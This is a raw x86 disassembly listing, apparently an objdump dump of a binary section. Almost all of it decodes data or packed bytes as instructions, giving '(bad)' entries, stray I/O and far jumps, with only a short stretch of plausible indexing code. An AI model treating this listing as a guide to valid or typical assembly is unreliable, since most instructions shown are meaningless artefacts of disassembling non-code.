  422f29:	imul   esi,DWORD PTR [ecx+eax*4-0x2e],0xffffffb8
  422f2e:	inc    edx
  422f2f:	in     al,0x71
  422f31:	pop    ebx
  422f32:	rep ins BYTE PTR es:[di],dx
  422f35:	or     al,0x2d
  422f38:	xchg   ecx,eax
  422f39:	push   ebp
  422f3a:	cmp    eax,0x9a0a6841
  422f3f:	mov    BYTE PTR [esi-0x7],dl
  422f42:	test   eax,0x9d87d85
  422f47:	push   ebp
  422f48:	cli    
  422f49:	jns    0x422f14
  422f4b:	jg     0x422f05
  422f4d:	adc    eax,edx
  422f4f:	leave  
  422f50:	popf   
  422f51:	fnsave [esi]
  422f53:	ja     0x422eed
  422f55:	ja     0x422f40
  422f57:	scas   eax,DWORD PTR es:[edi]
  422f58:	xor    eax,0x235fae4b
  422f5d:	mov    dh,BYTE PTR [esi-0xf]
  422f60:	outs   dx,DWORD PTR ds:[esi]
  422f61:	push   0xffffff88
  422f63:	adc    eax,0xfcecb573
  422f68:	xchg   edx,eax
  422f69:	ret    0xf227
  422f6c:	lods   al,BYTE PTR ds:[esi]
  422f6d:	pop    esp
  422f6e:	sub    DWORD PTR [esp+ebp*8-0x3aa8cf53],0xd39f1f47
  422f79:	cwde   
  422f7a:	xor    al,0x43
  422f7c:	and    al,0xc0
  422f7e:	pop    eax
  422f7f:	adc    ebp,DWORD PTR [eax+0x24fc35f1]
  422f85:	push   ss
  422f86:	push   ds
  422f87:	lds    eax,FWORD PTR [ecx+edi*4]
  422f8a:	mov    BYTE PTR [ebp+0x26],ch
  422f8d:	(bad)  
  422f8e:	jecxz  0x422fe0
  422f90:	sar    DWORD PTR [edx],1
  422f92:	in     eax,dx
  422f93:	cdq    
  422f94:	pushf  
  422f95:	dec    ecx
  422f96:	jb     0x422ff2
  422f98:	lods   eax,DWORD PTR ds:[esi]
  422f99:	out    0x98,al
  422f9b:	out    0xb5,al
  422f9d:	add    DWORD PTR [edx],edx
  422f9f:	mov    ds:0x7e845535,eax
  422fa4:	add    bh,BYTE PTR [esi]
  422fa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422fa7:	ja     0x422fb9
  422fa9:	mov    al,ds:0xed36f105
  422fae:	push   edx
  422faf:	push   ds
  422fb0:	(bad)  
  422fb1:	into   
  422fb2:	in     al,dx
  422fb3:	or     BYTE PTR [esi+0x503ae442],dl
  422fb9:	cmp    DWORD PTR [eax+eax*4+0x508e03f4],edi
  422fc0:	imul   ebp,ecx,0xffffff98
  422fc3:	sub    al,0x25
  422fc5:	sbb    eax,0x7971a2b8
  422fca:	fnstsw WORD PTR [ebp+0x76549cb4]
  422fd0:	into   
  422fd1:	in     al,dx
  422fd2:	jmp    0x70b8:0xa5dac258
  422fd9:	aam    0xb1
  422fdb:	sahf   
  422fdc:	bound  ecx,QWORD PTR [ebx+ebp*1]
  422fdf:	pop    esp
  422fe0:	jp     0x422ffa
  422fe2:	jp     0x423029
  422fe4:	mov    ch,ah
  422fe6:	jbe    0x423027
  422fe8:	int3   
  422fe9:	xchg   ecx,esp
  422feb:	std    
  422fec:	jmp    0x422fb3
  422fee:	dec    edx
  422fef:	jnp    0x42302e
  422ff1:	push   0x4df2e7f1
  422ff6:	xlat   BYTE PTR ds:[ebx]
  422ff7:	mov    fs:0xf8769f6c,al
  422ffd:	(bad)
  423000:	or     eax,0xfa48fb6e
  423005:	xor    edx,DWORD PTR [eax+0x7a]
  423008:	pop    ss
  423009:	inc    ecx
  42300a:	pushf  
  42300b:	ja     0x422fcc
  42300d:	xchg   ebp,eax
  42300e:	aaa    
  42300f:	sbb    BYTE PTR [edi],0xcd
  423012:	enter  0xa333,0x69
  423016:	jae    0x423091
  423018:	xor    DWORD PTR [ebx-0x1c],eax
  42301b:	into   
  42301c:	int    0xd1
  42301e:	sub    BYTE PTR [edx+0x2c],bh
  423021:	fsubr  DWORD PTR ds:0x35bcfe75
  423027:	sub    ch,BYTE PTR [esi+esi*8+0x4c]
  42302b:	ins    BYTE PTR es:[edi],dx
  42302c:	xor    eax,0x35eb89fa
  423031:	dec    ebp
  423032:	add    BYTE PTR [ebx+0x682084c6],0xb0
  423039:	pop    ecx
  42303a:	rcl    ecx,0x71
  42303d:	fidiv  DWORD PTR [ebp+0x63]
  423040:	inc    esi
  423041:	int    0xaa
  423043:	cs into 
  423045:	mov    eax,0xcb31aa72
  42304a:	xchg   esi,eax
  42304b:	dec    esi
  42304c:	add    eax,0xdcd01c
  423051:	pop    ds
  423052:	inc    edx
  423053:	dec    esi
  423054:	jae    0x423008
  423056:	pop    esp
  423057:	mov    ds:0x784b21d8,eax
  42305c:	popa   
  42305d:	and    DWORD PTR [eax],eax
  42305f:	push   ds
  423060:	ror    BYTE PTR [ecx-0x75],cl
  423063:	je     0x42303d
  423065:	mov    bh,0xf6
  423067:	jne    0x423073
  423069:	retf   
  42306a:	jmp    0x4230b4
  42306c:	sub    ecx,ecx
  42306e:	test   al,al
  423070:	hlt    
  423071:	inc    esi
  423072:	xor    al,0x77
  423074:	out    0xf8,al
  423076:	cli    
  423077:	pop    eax
  423078:	loope  0x4230c4
  42307a:	adc    DWORD PTR [ecx+0x1],edi
  42307d:	ins    DWORD PTR es:[edi],dx
  42307e:	stc    
  42307f:	mov    edi,0x848dd633
  423084:	add    bl,bl
  423086:	jb     0x4230ba
  423088:	add    BYTE PTR [edi],cl
  42308a:	mov    dh,0x55
  42308c:	push   DWORD PTR [ebx]
  42308e:	ror    BYTE PTR [eax+0x458aff55],1
  423094:	dec    DWORD PTR [ebx+0x5d8be455]
  42309a:	hlt    
  42309b:	xor    edx,esi
  42309d:	add    edx,edi
  42309f:	imul   edx,ebx
  4230a2:	mov    ebx,DWORD PTR [ebp-0x8]
  4230a5:	mov    BYTE PTR [edx+ebx*1],al
  4230a8:	mov    eax,DWORD PTR [ebp-0x1c]
  4230ab:	mov    edx,DWORD PTR [ebp-0xc]
  4230ae:	xor    eax,esi
  4230b0:	add    eax,edi
  4230b2:	imul   eax,edx
  4230b5:	mov    edx,DWORD PTR [ebp-0x8]
  4230b8:	mov    al,BYTE PTR [eax+edx*1]
  4230bb:	mov    BYTE PTR [ebp-0x1],al
  4230be:	mov    eax,DWORD PTR [ebp-0x1c]
  4230c1:	mov    edx,DWORD PTR [ebp-0xc]
  4230c4:	xor    eax,esi
  4230c6:	add    eax,edi
  4230c8:	imul   eax,edx
  4230cb:	mov    edx,DWORD PTR [ebp-0x3c]
  4230ce:	xor    edx,esi
  4230d0:	add    eax,edx
  4230d2:	jmp    0x423a66
  4230d7:	mov    ds:0x985c80eb,eax
  4230dc:	stos   DWORD PTR es:[edi],eax
  4230dd:	arpl   WORD PTR [ebx-0x7e],sp
  4230e0:	jg     0x4230ad
  4230e2:	xchg   BYTE PTR [edi-0x4eb6c074],ch
  4230e8:	xchg   esp,eax
  4230e9:	popa   
  4230ea:	(bad)  
  4230eb:	jmp    0x423166
  4230ed:	bound  esp,QWORD PTR [edx+0x18]
  4230f0:	imul   eax,DWORD PTR [ecx],0xffffff8f
  4230f3:	push   edi
  4230f4:	test   BYTE PTR [eax],bl
  4230f6:	jmp    0xdbbf:0x3f4877b8
  4230fd:	daa    
  4230fe:	popf   
  4230ff:	mov    esp,0x868bcb95
  423104:	mov    ah,0xec
  423106:	mov    ecx,0x63eef7fa
  42310b:	test   BYTE PTR [eax-0x28],0x98
  42310f:	push   0x1f1560b9
  423114:	cdq    
  423115:	and    DWORD PTR [ecx],ebx
  423117:	xor    dh,ah
  423119:	pop    edi
  42311a:	ja     0x423134
  42311c:	cmp    eax,0x801b5d12
  423121:	mov    DWORD PTR [esi],ebp
  423123:	and    DWORD PTR [ebp-0x7e],edx
  423126:	add    BYTE PTR [edx+0x7a],0x2a
  42312a:	nop
  42312b:	fidivr DWORD PTR [ecx-0x7e]
  42312e:	sub    eax,0xb0204cf2
  423133:	popf   
  423134:	or     al,0xf5
  423136:	fisubr DWORD PTR [edx]
  423138:	cmp    ebp,DWORD PTR [edx-0x7e2e0059]
  42313e:	std    
  42313f:	push   ecx
  423140:	fisttp WORD PTR [eax]
  423142:	push   edi
  423143:	pop    ebx
  423144:	pusha  
  423145:	dec    ebx
  423146:	push   0xc08587be
  42314b:	ret    0xc972
  42314e:	and    esp,DWORD PTR [esi-0x7d245402]
  423154:	xchg   cl,al
  423156:	ret    0x6d6f
  423159:	mov    bh,0x87
  42315b:	dec    edi
  42315c:	and    DWORD PTR [eax-0x50],eax
  42315f:	cli    
  423160:	adc    dh,BYTE PTR [esi]
  423162:	(bad)  
  423163:	enter  0x6e26,0x8a
  423167:	xchg   BYTE PTR [ebx],cl
  423169:	push   edi
  42316a:	lock mov edi,0x6e4a24fc
  423170:	jmp    0x1d9abc16
  423175:	cmp    eax,0x46d882a2
  42317a:	fild   DWORD PTR [eiz*1+0x485d86a1]
  423181:	imul   esp,DWORD PTR [esi],0xffffffc5
  423184:	adc    DWORD PTR [edi+ebx*8-0x5c],ebp
  423188:	rcr    edx,0xf5
  42318b:	dec    esi
  42318c:	ret    
  42318d:	int    0x98
  42318f:	dec    edi
  423190:	cli    
  423191:	les    ecx,FWORD PTR [edi]
  423193:	or     ebp,ebx
  423195:	lea    ebp,ds:0x5d827b00
  42319b:	aad    0xb9
  42319d:	out    dx,al
  42319e:	shl    ch,1
  4231a0:	in     al,dx
  4231a1:	add    ah,BYTE PTR [ecx+0x798d3646]
  4231a7:	gs std 
  4231a9:	xchg   esi,eax
  4231aa:	adc    eax,0x1448cf5f
  4231af:	and    al,0xab
  4231b1:	pop    esp
  4231b2:	adc    edx,eax
  4231b4:	leave  
  4231b5:	sti    
  4231b6:	inc    edi
  4231b7:	push   ss
  4231b8:	mov    ebx,0xda182ad5
  4231bd:	inc    eax
  4231be:	jle    0x423205
  4231c0:	adc    al,0xed
  4231c2:	fwait
  4231c3:	pusha  
  4231c4:	cld    
  4231c5:	xor    al,0x1c
  4231c7:	push   edi
  4231c8:	push   0x3aa0bd19
  4231cd:	mov    esp,0xe54af96a
  4231d2:	cld    
  4231d3:	inc    ebp
  4231d4:	add    al,0x74
  4231d6:	std    
  4231d7:	out    dx,eax
  4231d8:	sahf   
  4231d9:	icebp  
  4231da:	(bad)  
  4231db:	fbld   TBYTE PTR [eax+0x1e]
  4231de:	jecxz  0x42321a
  4231e0:	je     0x4231f6
  4231e2:	mov    ebp,0x179be134
  4231e7:	(bad)  
  4231e8:	ror    DWORD PTR [edi],cl
  4231ea:	pusha  
  4231eb:	mov    al,ds:0x4d1dd2d4
  4231f0:	(bad)  
  4231f1:	mov    edi,0xbdd91bb
  4231f6:	adc    al,0x6
  4231f8:	jl     0x4231e5
  4231fa:	aaa    
  4231fb:	(bad)  
  4231fd:	sar    DWORD PTR [esp+ebp*1+0x4f],1
  423201:	fisttp QWORD PTR [ebx+0x14f50855]
  423207:	pop    edx
  423208:	or     eax,0x880664b8
  42320d:	mov    cl,BYTE PTR [eax+0x52]
  423210:	adc    DWORD PTR [ecx-0x73612114],eax
  423216:	mov    dh,0x55
  423218:	sbb    al,0xbb
  42321a:	xchg   bh,al
  42321c:	(bad)  
  42321d:	in     al,dx
  42321e:	jo     0x423290
  423220:	xor    DWORD PTR [ecx],esp
  423222:	sti    
  423223:	mov    esi,0x386fe88d
  423228:	int    0x58
  42322a:	push   ebx
  42322b:	rol    BYTE PTR [edx-0xe6c0d91],1
  423231:	leave  
  423232:	xor    dh,BYTE PTR [edi-0x22]
  423235:	jns    0x4231f4
  423237:	repz mov esp,0x4ba42a3c
  42323d:	(bad)  [edi]
  42323f:	(bad)  
  423240:	push   ebp
  423241:	xchg   ebp,eax
  423242:	not    edi
  423244:	push   0x41
  423246:	and    DWORD PTR [edi],eax
  423248:	out    0xe6,eax
  42324a:	jl     0x4232aa
  42324c:	xlat   BYTE PTR ds:[ebx]
  42324d:	popf   
  42324e:	std    
  42324f:	push   ecx
  423250:	cmc    
  423251:	push   edi
  423252:	adc    BYTE PTR [edx],al
  423254:	mov    esi,0x13f0a575
  423259:	inc    ebp
  42325a:	mov    esi,esi
  42325c:	mov    esi,es
  42325e:	and    al,0x4a
  423260:	jae    0x4231f7
  423262:	cmp    al,bh
  423264:	xchg   esi,eax
  423265:	int    0x37
  423267:	aas    
  423268:	repz mov ebx,0x140f56f2
  42326e:	test   DWORD PTR [eax+0x17],ecx
  423271:	rol    esi,0x53
  423274:	addr16 mov bh,0xf1
  423277:	cmp    al,dl
  423279:	mov    cl,0xc2
  42327b:	push   edx
  42327c:	or     eax,0x2f4be34a
  423281:	popa   
  423282:	cmp    DWORD PTR [eax-0x6103ad69],edi
  423288:	mov    esi,DWORD PTR ds:0x1574b96f
  42328e:	mov    al,ds:0xd357f0af
  423293:	test   DWORD PTR [ecx],ebp
  423295:	jl     0x423242
  423297:	retf   
  423298:	pop    esi
  423299:	xor    eax,0x51e80919
  42329e:	out    0xd1,al
  4232a0:	pop    edx
  4232a1:	mov    edx,0x907fef39
  4232a6:	cwde   
  4232a7:	shl    dl,1
  4232a9:	(bad)  
  4232aa:	(bad)
  4232ad:	jae    0x42327d
  4232af:	nop
  4232b0:	std    
  4232b1:	test   ah,0xd
  4232b4:	test   eax,0x142e4123
  4232b9:	sub    BYTE PTR [ebp+edi*8-0x13],cl
  4232bd:	dec    edi
  4232be:	inc    ebx
  4232bf:	fsub   DWORD PTR [edi+0x56]
  4232c2:	nop
  4232c3:	lods   eax,DWORD PTR ds:[esi]
  4232c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232c5:	fwait
  4232c6:	fs icebp 
  4232c8:	xor    al,0x6
  4232ca:	ror    BYTE PTR [ecx+0x6a],0x25
  4232ce:	dec    ebx
  4232cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232d0:	shl    DWORD PTR [ecx-0x3482e275],0x91
  4232d7:	push   ss
  4232d8:	adc    bl,al
  4232da:	sub    ch,BYTE PTR [esi+0x3]
  4232dd:	add    dl,BYTE PTR [eax-0x69]
  4232e0:	fwait
  4232e1:	and    ah,BYTE PTR [edi+eiz*8-0x51]
  4232e5:	pop    esp
  4232e6:	add    DWORD PTR [eax+edx*8-0xd3b110f],esi
  4232ed:	adc    esp,ecx
  4232ef:	xor    ch,BYTE PTR [esi]
  4232f1:	mov    edi,0x9bc1b5ac
  4232f6:	fisttp QWORD PTR [ebp+0x718d3e44]
  4232fc:	(bad)  [esi-0x3]
  4232ff:	and    DWORD PTR [edx],esp
  423301:	inc    ebp
  423302:	stc    
  423303:	ret    
  423304:	cmp    BYTE PTR ds:0xa44f0852,bh
  42330a:	ins    BYTE PTR es:[edi],dx
  42330b:	jb     0x42333f
  42330d:	xchg   ebx,eax
  42330e:	jmp    DWORD PTR [esi+0x73]
  423311:	in     al,dx
  423312:	inc    ebx
  423313:	mul    ch
  423315:	adc    eax,0xc1880718
  42331a:	pop    es
  42331b:	pop    ebx
  42331c:	jle    0x4232d6
  42331e:	and    ebp,DWORD PTR [edi+0xf]
  423321:	mov    al,0x96
  423323:	out    dx,eax
  423324:	sub    DWORD PTR [ebp-0x51],0xf97a33cb
  42332b:	lods   al,BYTE PTR fs:[esi]
  42332d:	in     eax,0x6e
  42332f:	fimul  WORD PTR [edi+0x5]
  423332:	stos   DWORD PTR es:[edi],eax
  423333:	inc    esi
  423334:	mov    eax,0x41df3e94
  423339:	mov    eax,0x508a4e3f
  42333f:	sbb    ah,BYTE PTR [ebp+0x51]
  423342:	xchg   edi,eax
  423343:	pop    es
  423344:	hlt    
  423345:	daa    
  423346:	mov    ch,0x4a
  423348:	aam    0x80
  42334a:	outs   dx,DWORD PTR ds:[esi]
  42334b:	fld    DWORD PTR [ecx+0x522e3379]
  423351:	test   edx,ebp
  423353:	call   0x5298e3d9
  423358:	repnz loope 0x42335d
  42335b:	fs nop
  42335d:	(bad)  
  42335e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42335f:	pop    ecx
  423360:	(bad)  
  423361:	mov    bl,0x82
  423363:	mov    ch,0x27
  423365:	sub    al,0x4b
  423367:	inc    esi
  423368:	out    0xfc,eax
  42336a:	pop    esp
  42336b:	retf   0x4030
  42336e:	jae    0x4232f8
  423370:	outs   dx,DWORD PTR ds:[esi]
  423371:	retf   0x692f
  423374:	fidivr WORD PTR [esi]
  423376:	push   es
  423377:	lock std 
  423379:	(bad)  
  42337a:	repnz daa 
  42337c:	xchg   esi,esp
  42337e:	jnp    0x4233ac
  423380:	mov    edi,0xe2a5645f
  423385:	or     ecx,ecx
  423387:	sbb    DWORD PTR [edi-0x12693d12],ebx
  42338d:	lods   al,BYTE PTR ds:[esi]
  42338e:	nop
  42338f:	sub    DWORD PTR [esi+0x7f9fe085],edi
  423395:	repnz inc eax
  423397:	aas    
  423398:	mov    ebp,DWORD PTR [edx]
  42339a:	mov    DWORD PTR [ecx],edi
  42339c:	adc    DWORD PTR [ecx],edx
  42339e:	dec    esp
  42339f:	clc    
  4233a0:	sub    eax,0xd70c3fe3
  4233a5:	pop    ecx
  4233a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233a7:	pop    ss
  4233a8:	xor    al,0x46
  4233aa:	shr    esp,cl
  4233ac:	stc    
  4233ad:	cmp    BYTE PTR [ecx+ebp*8+0x43],0x4
  4233b2:	call   0xa75da0
  4233b7:	call   0x7139297
  4233bc:	daa    
  4233bd:	pop    ecx
  4233be:	and    al,0x30
  4233c0:	push   es
  4233c1:	mov    bh,0x9e
  4233c3:	and    bl,BYTE PTR [eax-0x54]
  4233c6:	pop    ds
  4233c7:	cld    
  4233c8:	jnp    0x423394
  4233ca:	jns    0x423398
  4233cc:	pushf  
  4233cd:	mov    dl,0xfc
  4233cf:	sbb    al,0x4e
  4233d1:	shr    DWORD PTR [edi+0x7c],cl
  4233d4:	push   ds
  4233d5:	cdq    
  4233d6:	je     0x4233ad
  4233d8:	xor    bh,0x5d
  4233db:	xchg   esi,eax
  4233dc:	loope  0x42337f
  4233de:	test   al,0xc9
  4233e0:	es sub al,0x90
  4233e3:	dec    ebp
  4233e4:	scas   eax,DWORD PTR es:[edi]
  4233e5:	push   eax
  4233e6:	adc    esi,ecx
  4233e8:	dec    edi
  4233e9:	dec    edi
  4233ea:	push   0xffffffc0
  4233ec:	sub    BYTE PTR [edx+0x6f],0x68
  4233f0:	dec    ebp
  4233f1:	imul   edi,DWORD PTR [esi-0x28],0x8c72dfe
  4233f8:	jbe    0x4233ef
  4233fa:	int3   
  4233fb:	sahf   
  4233fc:	add    al,0x9d
  4233fe:	add    esp,edx
  423400:	pop    ebx
  423401:	cli    
  423402:	popa   
  423403:	int3   
  423404:	imul   ecx,DWORD PTR [esi+0xea0e43a],0x89a53241
  42340e:	inc    esi
  42340f:	jo     0x423412
  423411:	imul   esi,DWORD PTR [edi-0x2c],0xffffffc1
  423415:	dec    ebx
  423416:	daa    
  423417:	pop    eax
  423418:	and    esi,0xffffffc2
  42341b:	lock retf 
  42341d:	ret    
  42341e:	or     DWORD PTR [edx],edi
  423420:	div    DWORD PTR [ebp-0x13]
  423423:	pop    ss
  423424:	xchg   BYTE PTR [edx],bh
  423426:	push   0xffffffaf
  423428:	mov    esp,0xeed0355d
  42342d:	and    dh,BYTE PTR [edi+0x2d08c8f2]
  423433:	iret   
  423434:	lahf   
  423435:	ins    BYTE PTR es:[edi],dx
  423436:	sub    DWORD PTR [edx],esi
  423438:	adc    edx,esp
  42343a:	mov    cl,0x15
  42343c:	shl    DWORD PTR [ebx-0x30603186],cl
  423442:	push   0x7c
  423444:	and    eax,0xda73cd52
  423449:	(bad)  
  42344a:	inc    bl
  42344c:	sbb    esi,ebp
  42344e:	xor    DWORD PTR ds:0x3690aadf,0x62199d19
  423458:	in     al,0xb4
  42345a:	(bad)  [eax+0x29]
  42345d:	loopne 0x42347a
  42345f:	jns    0x4234ca
  423461:	and    edi,ebp
  423463:	mov    esi,0xbfec5c6d
  423468:	in     al,0xcb
  42346a:	idiv   DWORD PTR [eax]
  42346c:	ins    DWORD PTR es:[edi],dx
  42346d:	sar    DWORD PTR [ebx+0x65e80077],0x62
  423474:	mov    ah,0xf5
  423476:	push   ecx
  423477:	scas   eax,DWORD PTR es:[edi]
  423478:	bnd jne 0x4234e1
  42347b:	scas   eax,DWORD PTR es:[edi]
  42347c:	pop    ebx
  42347d:	sub    al,dl
  42347f:	repz inc edx
  423481:	scas   al,BYTE PTR es:[edi]
  423482:	jg     0x423405
  423484:	sbb    bh,BYTE PTR [ebx+edx*4+0x18]
  423488:	ins    BYTE PTR es:[edi],dx
  423489:	int    0x2d
  42348b:	in     al,0x5f
  42348d:	cmc    
  42348e:	pop    esp
  42348f:	adc    ebp,DWORD PTR [eax-0x6b085b67]
  423495:	sar    DWORD PTR [ecx-0x4e],1
  423498:	es loope 0x4234b3
  42349b:	jnp    0x4234f5
  42349d:	mov    al,ds:0x63c9c36c
  4234a2:	xor    DWORD PTR [esi],0xa946ea54
  4234a8:	mov    al,0x7b
  4234aa:	outs   dx,DWORD PTR ds:[esi]
  4234ab:	jge    0x42343e
  4234ad:	scas   al,BYTE PTR es:[edi]
  4234ae:	data16 std 
  4234b0:	repnz mov ebx,0xf49d725
  4234b6:	push   esp
  4234b7:	jae    0x423452
  4234b9:	or     al,dh
  4234bb:	sbb    dh,BYTE PTR ds:0xd40ca5d3
  4234c1:	pop    esp
  4234c2:	out    dx,eax
  4234c3:	shl    DWORD PTR ds:0x7cbb518e,cl
  4234c9:	pop    ss
  4234ca:	ins    BYTE PTR es:[edi],dx
  4234cb:	ins    BYTE PTR es:[edi],dx
  4234cc:	push   ebx
  4234cd:	out    dx,al
  4234ce:	push   eax
  4234cf:	stos   DWORD PTR es:[edi],eax
  4234d0:	nop
  4234d1:	jbe    0x423484
  4234d3:	loopne 0x423530
  4234d5:	adc    eax,0xc8c87e06
  4234da:	arpl   WORD PTR [esi-0x76],ax
  4234dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234de:	add    eax,0xe935b9a5
  4234e3:	mov    ss,WORD PTR [esi+edx*8-0x3c]
  4234e7:	mov    esp,0x14c6d4ce
  4234ec:	cmp    DWORD PTR [ebx+0x2d],ebp
  4234ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4234f0:	and    BYTE PTR ds:0x2230051f,ch
  4234f6:	shr    DWORD PTR [esi],1
  4234f8:	mov    esp,DWORD PTR [eax-0x2c0da0a4]
  4234fe:	pop    ebx
  4234ff:	push   cs
  423500:	sub    ebp,ebp
  423502:	or     BYTE PTR [edi],ch
  423504:	and    al,0x7b
  423506:	push   cs
  423507:	mov    cl,0xa1
  423509:	aaa    
  42350a:	in     eax,0x9c
  42350c:	sbb    al,0x4a
  42350e:	add    al,0x2f
  423510:	cmp    BYTE PTR [edi-0x71cf4b40],al
  423516:	xor    eax,0xb7b93fbe
  42351b:	test   eax,0x9d3024b9
  423520:	out    dx,eax
  423521:	inc    eax
  423522:	mov    cl,bh
  423524:	je     0x423549
  423526:	in     eax,0xff
  423528:	add    eax,0x3a8c4c9f
  42352d:	inc    esp
  42352e:	out    0x3b,al
  423530:	sahf   
  423531:	mov    esp,0xcc06227e
  423536:	sahf   
  423537:	shl    eax,cl
  423539:	inc    ebp
  42353a:	jns    0x4235b9
  42353c:	in     eax,dx
  42353d:	push   edx
  42353e:	es and al,0xe2
  423541:	mov    ds:0x7008e25b,eax
  423546:	cdq    
  423547:	and    ecx,DWORD PTR [esp+ecx*1]
  42354a:	popf   
  42354b:	dec    esi
  42354c:	cmp    bh,BYTE PTR [ecx]
  42354e:	cdq    
  42354f:	mov    dh,0x6e
  423551:	into   
  423552:	mov    eax,0x23e8a63d
  423557:	mov    cl,0x79
  423559:	scas   eax,DWORD PTR es:[edi]
  42355a:	(bad)  
  42355b:	mov    edi,0x12d305
  423560:	ins    DWORD PTR es:[edi],dx
  423561:	lods   eax,DWORD PTR ds:[esi]
  423562:	pop    eax
  423563:	pop    ss
  423564:	stc    
  423565:	jmp    0x423512
  423567:	cmp    dl,BYTE PTR [ecx]
  423569:	jns    0x423569
  42356b:	and    al,0x3c
  42356d:	inc    edi
  42356e:	adc    DWORD PTR [edi-0x110e0c28],edi
  423574:	sar    BYTE PTR [ebx+0x4c],0x5b
  423578:	xchg   ebp,eax
  423579:	or     al,dh
  42357b:	call   0xba71858b
  423580:	mov    esp,0xac2aea47
  423585:	lds    eax,FWORD PTR [ebx]
  423587:	(bad)  
  423588:	aas    
  423589:	dec    eax
  42358a:	cld    
  42358b:	es imul esp,esi,0xadb7d68a
  423592:	mov    dh,0xfa
  423594:	lahf   
  423595:	iret   
  423596:	sbb    DWORD PTR [eax-0x4fae8e60],esp
  42359c:	iret   
  42359d:	and    al,0xe
  42359f:	add    edi,esp
  4235a1:	push   cs
  4235a2:	pop    es
  4235a3:	mov    cl,0xfb
  4235a5:	out    0x8b,eax
  4235a7:	mov    WORD PTR [ecx+0x34],cs
  4235aa:	adc    eax,0x60db9f47
  4235af:	jle    0x4235c2
  4235b1:	xchg   BYTE PTR [edi],bh
  4235b3:	pop    eax
  4235b4:	(bad)  
  4235b7:	xor    BYTE PTR [ebx+0x69ee71bf],ah
  4235bd:	jl     0x42361c
  4235bf:	call   0xc2b60bef
  4235c4:	mov    dh,0x27
  4235c6:	xchg   esi,eax
  4235c7:	fisttp DWORD PTR [ebx-0x3a]
  4235ca:	lea    ebx,ds:0x96b0938f
  4235d0:	dec    esp
  4235d1:	dec    eax
  4235d2:	and    BYTE PTR [edx-0x59],dl
  4235d5:	and    bl,BYTE PTR [edx-0x80]
  4235d8:	inc    ecx
  4235d9:	popa   
  4235da:	jecxz  0x4235ea
  4235dc:	outs   dx,DWORD PTR ds:[esi]
  4235dd:	pushf  
  4235de:	sub    eax,0x48d97a
  4235e3:	aas    
  4235e4:	mov    eax,ds:0xf033616c
  4235e9:	ror    BYTE PTR [edi-0x5d1b9632],1
  4235ef:	in     al,0x29
  4235f1:	out    0x2c,al
  4235f3:	mov    dh,0x1b
  4235f5:	mov    ds:0x8575d719,eax
  4235fa:	pop    ebp
  4235fb:	sbb    al,0xd1
  4235fd:	adc    al,0x95
  4235ff:	push   edx
  423600:	mov    dl,0xcb
  423602:	inc    ecx
  423603:	in     eax,dx
  423604:	out    dx,eax
  423605:	sbb    bl,0x66
  423608:	inc    BYTE PTR [ebx+0x459a1e72]
  42360e:	adc    ebp,DWORD PTR [ebx+0x2534a7e0]
  423614:	mov    esi,0xd19a5c6a
  423619:	imul   esp,DWORD PTR [edi+0x2d76b675],0xe5ac692a
  423623:	mov    eax,0x38bdfb8a
  423628:	jp     0x4235aa
  42362a:	pop    ecx
  42362b:	or     DWORD PTR es:[ebp-0x11427277],0x3d
  423633:	maxps  xmm1,xmm3
  423636:	scas   eax,DWORD PTR es:[edi]
  423637:	jecxz  0x42366c
  423639:	lods   al,BYTE PTR ds:[esi]
  42363a:	je     0x42363a
  42363c:	push   ebx
  42363d:	fmul   DWORD PTR [ebx-0x7148593a]
  423643:	mov    ss,WORD PTR ds:0xc6d1366d
  423649:	push   esp
  42364a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42364b:	jge    0x4235ce
  42364d:	mov    dh,0xf6
  42364f:	ins    DWORD PTR es:[edi],dx
  423650:	loop   0x4235fe
  423652:	stos   BYTE PTR es:[edi],al
  423653:	or     DWORD PTR ds:0xd9c0b7cb,0xfffffff7
  42365a:	lea    edx,[eax]
  42365c:	lahf   
  42365d:	aam    0x95
  42365f:	mov    dh,BYTE PTR [eax+0x68]
  423662:	call   0x43e7:0xdc8a4f9b
  423669:	inc    eax
  42366a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42366b:	dec    ebx
  42366c:	jnp    0x42362c
  42366e:	ror    DWORD PTR ds:0x7924c91b,cl
  423674:	fwait
  423675:	adc    eax,0x7b610644
  42367a:	pop    ebx
  42367b:	ror    BYTE PTR [ebx+0x43cb649],0xca
  423682:	ds ret 0xa617
  423686:	jp     0x423679
  423688:	sub    ch,ah
  42368a:	or     BYTE PTR [edi+ebx*8+0x5d],ah
  42368e:	xlat   BYTE PTR ds:[ebx]
  42368f:	(bad)  
  423690:	or     al,0x6d
  423692:	call   0xc910c73c
  423697:	push   esp
  423698:	inc    edx
  423699:	rcl    BYTE PTR [ebp-0x23],0x6b
  42369d:	(bad)  
  42369e:	ret    0x12f4
  4236a1:	mov    eax,ds:0x1d7bf108
  4236a6:	add    al,BYTE PTR [edx]
  4236a8:	or     al,0xff
  4236aa:	pushf  
  4236ab:	pop    ebp
  4236ac:	mov    dh,0x24
  4236ae:	(bad)  
  4236af:	xchg   edx,eax
  4236b0:	data16 and ah,BYTE PTR [ecx-0x7806fba7]
  4236b7:	push   edi
  4236b8:	and    ah,BYTE PTR [ebp+eax*4-0x34]
  4236bc:	mov    ebp,0xcec60bce
  4236c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4236c2:	mov    fs,WORD PTR [ebx+0x7858f778]
  4236c8:	jno    0x423711
  4236ca:	mov    edi,0xf78b7a67
  4236cf:	inc    edi
  4236d0:	lods   al,BYTE PTR ds:[esi]
  4236d1:	cmp    ch,BYTE PTR [ebp-0x1ad79df6]
  4236d7:	push   0xffffffa4
  4236d9:	sub    edi,DWORD PTR ds:0xabfb8643
  4236df:	cmp    eax,ebx
  4236e1:	cmp    al,0x72
  4236e3:	cld    
  4236e4:	pop    edx
  4236e5:	rcr    BYTE PTR [ebx+0x50f13b2d],1
  4236eb:	pop    ecx
  4236ec:	inc    esp
  4236ed:	mov    ebp,0xae113dfa
  4236f2:	in     al,0x22
  4236f4:	jmp    0x815902cb
  4236f9:	cs mov dl,0x7a
